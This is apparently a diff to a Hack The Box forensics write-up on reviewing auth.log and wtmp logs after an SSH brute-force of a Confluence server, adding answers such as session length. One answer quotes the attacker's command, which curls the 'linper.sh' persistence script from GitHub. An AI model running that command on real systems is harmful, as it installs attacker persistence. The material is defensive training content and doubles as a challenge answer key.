@@ -8,6 +8,7 @@
 - Reviewing UNIX auth.log.
 - Identifying the suspect's IP.
 - Identify the timestamp for initial manual account logged in / manual entry.
+- Reviwing wtmp log file.
 
 ## SCENARIO:
 In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.
@@ -104,12 +105,39 @@ It's located in the /var/log directory in most Unix systems.
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/51fa79a9-78fe-47eb-a1eb-ae06959b5414)
 
 
-> 7TH QUESTION --> ANS:
+> 7TH QUESTION --> ANS: 279
 
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/4dffcc64-f4c4-48d9-b674-1e7c3140be20)
 
 
-> 8TH QUESTION --> ANS:
+17. Upon reviewing the wtmp log file, we're sure that the attacker's session for the root account is destroyed at `06:37 (UTC+8)`.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/e5812d75-f4dc-497a-b3b7-f43175052b64)
+
+
+18. To identify the **second** time, review the auth.log which states **remove session** or **close session**.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/104a386a-b581-4009-a58d-6d1065760940)
+
+
+19. Then to calculate the session should be a cumulative time from:
+
+```
+06:32:45 - 06:37:24 --> 279 seconds.
+```
+
+> 8TH QUESTION --> ANS: `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`
 
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/e2e4ac94-d7a5-48ec-af40-ea78df85b254)
 
+
+20. Furthermore the attacker logged in to the server as **cyberjunkie** and executed sudo command at `06:39:38`.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/e10dc690-63a9-4fca-ab48-ff2be7eda996)
+
+
+## IMPORTANT LINKS
+
+```
+https://attack.mitre.org/techniques/T1136/
+```
